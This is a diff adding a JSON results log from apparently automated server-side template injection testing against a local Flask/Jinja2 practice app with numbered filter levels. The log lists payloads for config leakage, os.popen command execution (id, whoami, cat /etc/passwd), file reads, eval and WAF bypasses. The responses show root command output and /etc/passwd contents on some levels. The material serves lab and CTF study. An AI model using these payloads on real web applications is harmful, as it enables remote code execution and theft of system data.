+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "vulnerable": false,
+      "has_rce": false,
+      "has_file_read": false,
+      "has_eval": false,
+      "has_config_leak": false
+    },
+    {
+      "level": 7,
+      "filter_info": "过滤 .__class__ + '2' + 'request'",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello 49",
+          "class": "SHORT"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello 7777777",
+          "class": "DATA"
+        },
+        "{{config}}": {
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: Fa",
+          "class": "ERROR"
+        },
+        "{{self}}": {
+          "response": "Hello &lt;TemplateReference None&gt;",
+          "class": "DATA"
+        },
+        "{{request}}": {
+          "response": "Hello &lt;Request &#39;http://127.0.0.1:5000/level/7&#39; [POST]&gt;",
+          "class": "DATA"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello &lt;class &#39;tuple&#39;&gt;",
+          "class": "DATA"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello [&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;cla",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "Hello uid=0(root) gid=0(root) groups=0(root)",
+          "class": "DATA"
+        }
+      ],
+      "vulnerable": true,
+      "has_rce": false,
+      "has_file_read": false,
+      "has_eval": false,
+      "has_config_leak": false
+    },
+    {
+      "level": 8,
+      "filter_info": "过滤 .__class__ + 'request'",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello 49",
+          "class": "SHORT"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello 7777777",
+          "class": "DATA"
+        },
+        "{{config}}": {
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: Fa",
+          "class": "ERROR"
+        },
+        "{{self}}": {
+          "response": "Hello &lt;TemplateReference None&gt;",
+          "class": "DATA"
+        },
+        "{{request}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "vulnerable": false,
+      "has_rce": false,
+      "has_file_read": false,
+      "has_eval": false,
+      "has_config_leak": false
+    },
+    {
+      "level": 9,
+      "filter_info": "WAF 拦截 {{7*7}} 但允许 {{config}}",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{config}}": {
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: Fa",
+          "class": "ERROR"
+        },
+        "{{self}}": {
+          "response": "Hello &lt;TemplateReference None&gt;",
+          "class": "DATA"
+        },
+        "{{request}}": {
+          "response": "Hello &lt;Request &#39;http://127.0.0.1:5000/level/9&#39; [POST]&gt;",
+          "class": "DATA"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello &lt;class &#39;str&#39;&gt;",
+          "class": "DATA"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello &lt;class &#39;tuple&#39;&gt;",
+          "class": "DATA"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "Hello environ({&#39;HOSTNAME&#39;: &#39;14e9a7d67649&#39;, &#39;SHLVL&#39;: &#39;2&#39;, &#39;HOME&#39;: &#39;/root&#39;",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_",
+          "class": "ERROR"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "Hello uid=0(root) gid=0(root) groups=0(root)",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "Hello bin\nboot\ndev\netc\nflag\nget-pip.py\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nshell.php\nsrv\nstorage.txt\nsys\ntmp",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "Hello root",
+          "class": "SHORT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "Hello uid=0(root) gid=0(root) groups=0(root)",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello uid=0(root) gid=0(root) groups=0(root)",
+          "class": "DATA"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello uid=0(root) gid=0(root) groups=0(root)",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello 14e9a7d67649",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "Hello None",
+          "class": "SHORT"
+        }
+      ],
+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello [&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;cla",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "Hello uid=0(root) gid=0(root) groups=0(root)",
+          "class": "DATA"
+        }
+      ],
+      "vulnerable": true,
+      "has_rce": true,
+      "has_file_read": true,
+      "has_eval": true,
+      "has_config_leak": true
+    },
+    {
+      "level": 10,
+      "filter_info": "config 返回 None - 可能重写了 config",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello 49",
+          "class": "SHORT"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello 7777777",
+          "class": "DATA"
+        },
+        "{{config}}": {
+          "response": "Hello None",
+          "class": "SHORT"
+        },
+        "{{self}}": {
+          "response": "Hello None",
+          "class": "SHORT"
+        },
+        "{{request}}": {
+          "response": "Hello &lt;Request &#39;http://127.0.0.1:5000/level/10&#39; [POST]&gt;",
+          "class": "DATA"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello &lt;class &#39;str&#39;&gt;",
+          "class": "DATA"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello &lt;class &#39;tuple&#39;&gt;",
+          "class": "DATA"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello None",
+          "class": "SHORT"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_",
+          "class": "ERROR"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "No this level",
+          "class": "BLOCKED"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nolog",
+          "class": "DATA"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "No this level",
+          "class": "BLOCKED"
+        }
+      ],
+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello [&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;cla",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "No this level",
+          "class": "BLOCKED"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "No this level",
+          "class": "BLOCKED"
+        }
+      ],
+      "vulnerable": true,
+      "has_rce": false,
+      "has_file_read": true,
+      "has_eval": false,
+      "has_config_leak": false
+    },
+    {
+      "level": 11,
+      "filter_info": "过滤 .__class__ + 'request'",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello 49",
+          "class": "SHORT"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{config}}": {
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: Fa",
+          "class": "ERROR"
+        },
+        "{{self}}": {
+          "response": "Hello &lt;TemplateReference None&gt;",
+          "class": "DATA"
+        },
+        "{{request}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"__i",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "file_read": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"cat /et",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"ope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{get_flashed_messages.__globals__[\"__builtins__\"][\"open\"](\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{lipsum.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\").",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__[\"__builtins__\"][\"open\"](\"/etc/passwd\")",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "eval": [
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"eva",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"__builtins__\"][\"exe",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "bypass": [
+        {
+          "payload": "{{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{()|attr(\"\\x5f\\x5fclass\\x5f\\x5f\")|attr(\"\\x5f\\x5fmro\\x5f\\x5f",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\"",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{\"\"[\"__class__\"][\"__mro__\"][2][\"__subclasses__\"]()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config[\"__class__\"][\"__init__\"][\"__globals__\"][\"os\"][\"pope",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "vulnerable": false,
+      "has_rce": false,
+      "has_file_read": false,
+      "has_eval": false,
+      "has_config_leak": false
+    },
+    {
+      "level": 12,
+      "filter_info": "多层过滤 - {{7*7}} 拦截但 config 允许",
+      "probe": {
+        "{{7*7}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{7*'7'}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{config}}": {
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: Fa",
+          "class": "ERROR"
+        },
+        "{{self}}": {
+          "response": "Hello &lt;TemplateReference None&gt;",
+          "class": "DATA"
+        },
+        "{{request}}": {
+          "response": "Hello &lt;Request &#39;http://127.0.0.1:5000/level/12&#39; [POST]&gt;",
+          "class": "DATA"
+        },
+        "{{''.__class__}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        "{{()|attr('__class__')}}": {
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      },
+      "config_leak": [
+        {
+          "payload": "{{config}}",
+          "response": "Hello &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_",
+          "class": "ERROR"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__['os'].environ}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{url_for.__globals__['current_app'].config}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        }
+      ],
+      "rce": [
+        {
+          "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").re",
+          "response": "Hello WAF",
+          "class": "WAF"
+        },
+        {
+          "payload": "{{config.__class__.__init__.__globals__[\"os\"].popen(\"whoami\"",
+          "response": "Hello WAF",
